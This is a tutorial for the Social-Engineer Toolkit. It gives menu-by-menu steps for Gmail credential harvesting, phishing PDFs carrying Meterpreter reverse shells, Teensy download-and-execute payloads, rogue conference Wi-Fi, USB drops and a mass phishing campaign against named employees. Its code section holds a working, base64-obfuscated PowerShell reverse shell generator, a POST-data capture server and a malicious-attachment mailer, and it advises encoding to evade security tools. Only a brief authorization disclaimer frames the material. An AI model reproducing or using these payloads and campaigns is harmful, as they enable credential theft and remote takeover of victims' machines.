# Social Engineering Toolkit (SET) - Examples and Tutorials

## Table of Contents
1. [Basic Examples](#basic-examples)
2. [Advanced Examples](#advanced-examples)
3. [Real-World Scenarios](#real-world-scenarios)
4. [Troubleshooting Examples](#troubleshooting-examples)
5. [Code Examples](#code-examples)

## Basic Examples

### 1. Simple Credential Harvester

**Scenario**: Clone a popular website to harvest credentials.

**Steps**:
```bash
# Launch SET
setoolkit

# Navigate to web attacks
1) Social-Engineering Attacks
   2) Website Attack Vectors
       2) Credential Harvester Attack Method
           1) Web Templates
               2) Gmail
               1) Site Cloner
                   https://gmail.com
               192.168.1.100
               80
```

**Expected Output**:
```
[*] The Social-Engineer Toolkit Credential Harvester
[*] This tool is designed to give you the credentials of a target
[*] All attacks are designed to work on the latest version of Internet Explorer
[*] and Firefox running on the latest version of Windows
[*] Credential harvester will be set up at: http://192.168.1.100
[*] The Social-Engineer Toolkit will now start the web server
[*] Please send your target to: http://192.168.1.100
```

### 2. Email Attack with PDF Payload

**Scenario**: Send malicious PDF to target via email.

**Steps**:
```bash
# Launch SET
setoolkit

# Navigate to spear phishing
1) Social-Engineering Attacks
   1) Spear-Phishing Attack Vectors
       1) Send email to target
           1) Email Attack Single Email Address
               victim@company.com
               Important Security Update
               Please review the attached security document
               1) File Format Exploits
                  1) PDF
                     1) Windows Meterpreter Reverse TCP
                        192.168.1.100
                        4444
```

**Expected Output**:
```
[*] The Social-Engineer Toolkit will now start the web server
[*] Please send your target to: http://192.168.1.100
[*] The Social-Engineer Toolkit will now start the web server
[*] Please send your target to: http://192.168.1.100
```

### 3. Teensy USB HID Attack

**Scenario**: Create Teensy payload for physical device attack.

**Steps**:
```bash
# Launch SET
setoolkit

# Navigate to Teensy attacks
1) Social-Engineering Attacks
   5) Teensy USB HID Attack Vector
      1) Create a payload and listener
         1) PowerShell Download and Execute
            192.168.1.100
            80
            1) Yes
```

**Expected Output**:
```
[*] Teensy HID Attack Vector
[*] This attack will create a Teensy HID attack vector
[*] The Social-Engineer Toolkit will now start the web server
[*] Please send your target to: http://192.168.1.100
```

## Advanced Examples

### 1. Multi-Vector Web Attack

**Scenario**: Combine multiple attack vectors on a single website.

**Steps**:
```bash
# Launch SET
setoolkit

# Navigate to multi-attack
1) Social-Engineering Attacks
   2) Website Attack Vectors
       6) Multi-Attack Web Method
          1) Java Applet Attack Method
          2) Credential Harvester Attack Method
          3) Tabnabbing Attack Method
             https://target-website.com
             192.168.1.100
             80
```

**Expected Output**:
```
[*] Multi-Attack Web Method
[*] This attack will combine multiple attack vectors
[*] The Social-Engineer Toolkit will now start the web server
[*] Please send your target to: http://192.168.1.100
```

### 2. Custom Email Template Attack

**Scenario**: Use custom email template for targeted attack.

**Steps**:
```bash
# Create custom template
echo "Subject: {SUBJECT}
From: {FROM_NAME} <{FROM_EMAIL}>
To: {TARGET_EMAIL}

Dear {TARGET_NAME},

We have detected suspicious activity on your account.
Please review the attached security report.

Best regards,
{FROM_NAME}" > /tmp/custom_template.template

# Launch SET
setoolkit

# Navigate to mass mailer
1) Social-Engineering Attacks
   1) Spear-Phishing Attack Vectors
       2) Mass Email Attack
          /tmp/email_list.txt
          1) Pre-Defined Email Templates
             1) Custom Template
                /tmp/custom_template.template
```

**Expected Output**:
```
[*] Mass Email Attack
[*] This attack will send emails to multiple targets
[*] The Social-Engineer Toolkit will now start the web server
[*] Please send your target to: http://192.168.1.100
```

### 3. Wireless Access Point Attack

**Scenario**: Create malicious access point for wireless attacks.

**Steps**:
```bash
# Launch SET
setoolkit

# Navigate to wireless attacks
1) Social-Engineering Attacks
   6) Wireless Attack Vectors
      1) Access Point Attack Vector
         1) Hostapd
            wlan0
            Free_WiFi
            6
            192.168.1.100
            80
```

**Expected Output**:
```
[*] Access Point Attack Vector
[*] This attack will create a malicious access point
[*] The Social-Engineer Toolkit will now start the web server
[*] Please send your target to: http://192.168.1.100
```

## Real-World Scenarios

### 1. Corporate Phishing Campaign

**Scenario**: Target employees of a specific company with realistic phishing emails.

**Preparation**:
```bash
# Research target company
# - Company name: TechCorp
# - Employee emails: employees@techcorp.com
# - Company website: https://techcorp.com
# - Security policies: IT department contact

# Create email list
echo "john.doe@techcorp.com
jane.smith@techcorp.com
bob.wilson@techcorp.com" > /tmp/techcorp_employees.txt

# Create custom template
echo "Subject: Urgent: Security Policy Update Required
From: IT Security <security@techcorp.com>
To: {TARGET_EMAIL}

Dear {TARGET_NAME},

Our security team has identified a potential vulnerability in our systems.
Please review the attached security policy update and confirm receipt.

This is mandatory for all employees.

Best regards,
IT Security Team
TechCorp" > /tmp/security_policy.template
```

**Execution**:
```bash
# Launch SET
setoolkit

# Navigate to mass mailer
1) Social-Engineering Attacks
   1) Spear-Phishing Attack Vectors
       2) Mass Email Attack
          /tmp/techcorp_employees.txt
          1) Pre-Defined Email Templates
             1) Custom Template
                /tmp/security_policy.template
               1) File Format Exploits
                  1) PDF
                     1) Windows Meterpreter Reverse TCP
                        192.168.1.100
                        4444
```

**Expected Results**:
- Multiple employees receive realistic phishing emails
- Some employees click on malicious PDF
- Meterpreter sessions established on compromised systems
- Credentials and sensitive data harvested

### 2. Conference Wi-Fi Attack

**Scenario**: Set up malicious Wi-Fi at a security conference.

**Preparation**:
```bash
# Research conference
# - Conference name: SecurityCon 2024
# - Location: Convention Center
# - Attendees: Security professionals
# - Wi-Fi: SecurityCon_WiFi

# Create realistic access point
# - SSID: SecurityCon_WiFi
# - Channel: 6 (2.4GHz)
# - Security: Open (to attract users)
```

**Execution**:
```bash
# Launch SET
setoolkit

# Navigate to wireless attacks
1) Social-Engineering Attacks
   6) Wireless Attack Vectors
      1) Access Point Attack Vector
         1) Hostapd
            wlan0
            SecurityCon_WiFi
            6
            192.168.1.100
            80
```

**Expected Results**:
- Conference attendees connect to malicious access point
- DNS requests redirected to attacker's server
- Credentials and sensitive data intercepted
- Potential access to corporate networks

### 3. USB Drop Attack

**Scenario**: Plant malicious USB devices in target organization.

**Preparation**:
```bash
# Create multiple USB payloads
# - Payload 1: PowerShell downloader
# - Payload 2: Java applet
# - Payload 3: HTA attack

# Create realistic USB labels
# - "Q4 Financial Report"
# - "Employee Photos"
# - "Company Policies"
```

**Execution**:
```bash
# Launch SET
setoolkit

# Navigate to infectious media
1) Social-Engineering Attacks
   3) Infectious Media Generator
      1) File-Format Exploits
         1) PDF
            1) Windows Meterpreter Reverse TCP
               192.168.1.100
               4444
```

**Expected Results**:
- Curious employees insert USB devices
- Malicious payloads execute on target systems
- Meterpreter sessions established
- Network access gained

## Troubleshooting Examples

### 1. Metasploit Not Found

**Problem**: SET cannot find Metasploit installation.

**Error Message**:
```
[!] Metasploit not found. Please install Metasploit Framework.
```

**Solution**:
```bash
# Install Metasploit Framework
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb | bash

# Or set custom path in configuration
echo "METASPLOIT_PATH=/opt/metasploit-framework/" >> /etc/setoolkit/set.config

# Verify installation
msfconsole --version
```

### 2. Port Already in Use

**Problem**: Web server cannot bind to port 80.

**Error Message**:
```
[!] Looks like the web_server can't bind to 80. Are you running Apache or NGINX?
```

**Solution**:
```bash
# Stop conflicting services
systemctl stop apache2
systemctl stop nginx

# Or use different port
echo "WEB_PORT=8080" >> /etc/setoolkit/set.config

# Check port availability
netstat -tlnp | grep :80
```

### 3. Permission Denied

**Problem**: SET cannot write to required directories.

**Error Message**:
```
[!] Permission denied: '/etc/setoolkit/set.config'
```

**Solution**:
```bash
# Run with appropriate privileges
sudo setoolkit

# Or fix file permissions
sudo chmod -R 755 /usr/local/share/setoolkit/
sudo chmod 644 /etc/setoolkit/set.config
```

### 4. Python Module Missing

**Problem**: Required Python modules are not installed.

**Error Message**:
```
[!] The python-pycrypto python module not installed.
```

**Solution**:
```bash
# Install missing dependencies
pip install -r requirements.txt

# Or install specific module
pip install pycrypto
pip install requests
pip install pyopenssl
```

### 5. SSL Certificate Issues

**Problem**: SSL certificate problems with HTTPS attacks.

**Error Message**:
```
[!] SSL certificate not found. Please generate SSL certificate.
```

**Solution**:
```bash
# Generate self-signed certificate
openssl req -x509 -newkey rsa:4096 -keyout ssl.key -out ssl.crt -days 365 -nodes

# Copy to SET directory
sudo cp ssl.key /etc/setoolkit/
sudo cp ssl.crt /etc/setoolkit/

# Update configuration
echo "WEBATTACK_SSL=ON" >> /etc/setoolkit/set.config
```

## Code Examples

### 1. Custom Module Development

**Creating a Custom Attack Module**:
```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Module Name: Custom Attack Module
Description: Example custom attack module
Author: Security Researcher
Version: 1.0
"""

MAIN="Custom Attack Module Example"

def main():
    """Main module function"""
    try:
        print("[*] Custom Attack Module")
        print("[*] This is an example custom module")
        
        # Get target information
        target = input("[*] Enter target IP address: ")
        port = input("[*] Enter target port: ")
        
        # Perform attack
        print(f"[*] Attacking {target}:{port}")
        
        # Simulate attack
        import time
        time.sleep(2)
        
        print("[*] Attack completed successfully")
        return True
        
    except Exception as e:
        print(f"[!] Error: {str(e)}")
        return False

if __name__ == "__main__":
    main()
```

### 2. Custom Payload Generation

**Creating Custom Payloads**:
```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os
import sys
import base64
import random
import string

def generate_random_string(length):
    """Generate random alphanumeric string"""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def create_custom_payload(ip, port):
    """Create custom payload"""
    payload = f"""
    # Custom PowerShell payload
    $client = New-Object System.Net.Sockets.TCPClient("{ip}", {port})
    $stream = $client.GetStream()
    $buffer = New-Object byte[] 1024
    while ($true) {{
        $bytes = $stream.Read($buffer, 0, $buffer.Length)
        if ($bytes -gt 0) {{
            $command = [System.Text.Encoding]::ASCII.GetString($buffer, 0, $bytes)
            $result = Invoke-Expression $command
            $response = [System.Text.Encoding]::ASCII.GetBytes($result)
            $stream.Write($response, 0, $response.Length)
        }}
    }}
    """
    
    # Encode payload
    encoded_payload = base64.b64encode(payload.encode()).decode()
    
    # Create obfuscated version
    obfuscated = f"""
    $encoded = "{encoded_payload}"
    $decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encoded))
    Invoke-Expression $decoded
    """
    
    return obfuscated

def main():
    """Main function"""
    ip = input("[*] Enter target IP: ")
    port = input("[*] Enter target port: ")
    
    payload = create_custom_payload(ip, port)
    
    # Save payload
    filename = f"custom_payload_{generate_random_string(8)}.ps1"
    with open(filename, 'w') as f:
        f.write(payload)
    
    print(f"[*] Custom payload saved as: {filename}")
    print(f"[*] Payload size: {len(payload)} bytes")

if __name__ == "__main__":
    main()
```

### 3. Custom Web Server

**Creating Custom Web Server**:
```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-

import http.server
import socketserver
import threading
import time
import os

class CustomHandler(http.server.SimpleHTTPRequestHandler):
    """Custom HTTP handler"""
    
    def do_GET(self):
        """Handle GET requests"""
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            
            html = """
            <!DOCTYPE html>
            <html>
            <head>
                <title>Custom Attack Page</title>
            </head>
            <body>
                <h1>Welcome to Custom Attack Page</h1>
                <p>This is a custom attack page.</p>
                <script>
                    // Custom JavaScript payload
                    console.log("Custom payload executed");
                </script>
            </body>
            </html>
            """
            
            self.wfile.write(html.encode())
        else:
            super().do_GET()
    
    def do_POST(self):
        """Handle POST requests"""
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        
        # Log captured data
        print(f"[*] Captured POST data: {post_data.decode()}")
        
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b"OK")

def start_server(port):
    """Start custom web server"""
    handler = CustomHandler
    httpd = socketserver.TCPServer(("", port), handler)
    
    print(f"[*] Custom web server started on port {port}")
    print(f"[*] Access: http://localhost:{port}")
    
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Server stopped")
        httpd.shutdown()

def main():
    """Main function"""
    port = int(input("[*] Enter port number: "))
    start_server(port)

if __name__ == "__main__":
    main()
```

### 4. Custom Email Template

**Creating Custom Email Templates**:
```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-

import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

def create_email_template(subject, body, attachment_path=None):
    """Create email template"""
    template = f"""
    Subject: {subject}
    From: {{FROM_NAME}} <{{FROM_EMAIL}}>
    To: {{TARGET_EMAIL}}
    
    Dear {{TARGET_NAME}},
    
    {body}
    
    Best regards,
    {{FROM_NAME}}
    """
    
    return template

def send_email(to_email, subject, body, attachment_path=None):
    """Send email with attachment"""
    # Email configuration
    smtp_server = "smtp.gmail.com"
    smtp_port = 587
    username = "your-email@gmail.com"
    password = "your-app-password"
    
    # Create message
    msg = MIMEMultipart()
    msg['From'] = username
    msg['To'] = to_email
    msg['Subject'] = subject
    
    # Add body
    msg.attach(MIMEText(body, 'plain'))
    
    # Add attachment
    if attachment_path and os.path.exists(attachment_path):
        with open(attachment_path, "rb") as attachment:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attachment.read())
            encoders.encode_base64(part)
            part.add_header(
                'Content-Disposition',
                f'attachment; filename= {os.path.basename(attachment_path)}'
            )
            msg.attach(part)
    
    # Send email
    server = smtplib.SMTP(smtp_server, smtp_port)
    server.starttls()
    server.login(username, password)
    text = msg.as_string()
    server.sendmail(username, to_email, text)
    server.quit()
    
    print(f"[*] Email sent to {to_email}")

def main():
    """Main function"""
    # Create email template
    template = create_email_template(
        "Important Security Update",
        "Please review the attached security document for important updates."
    )
    
    # Send email
    send_email(
        "target@company.com",
        "Important Security Update",
        template,
        "/path/to/malicious.pdf"
    )

if __name__ == "__main__":
    main()
```

## Best Practices

### 1. Security Considerations
- Always obtain proper authorization before testing
- Use isolated test environments
- Follow responsible disclosure practices
- Comply with all applicable laws and regulations

### 2. Operational Best Practices
- Plan attacks thoroughly
- Test payloads in controlled environments
- Monitor all activities
- Maintain detailed logs
- Document all findings

### 3. Technical Best Practices
- Use multiple encoding techniques
- Test against various security solutions
- Implement proper error handling
- Use randomized filenames and paths
- Regular security updates

---

These examples and tutorials provide comprehensive guidance for using the Social Engineering Toolkit effectively and responsibly. Always ensure you have proper authorization before conducting any security tests.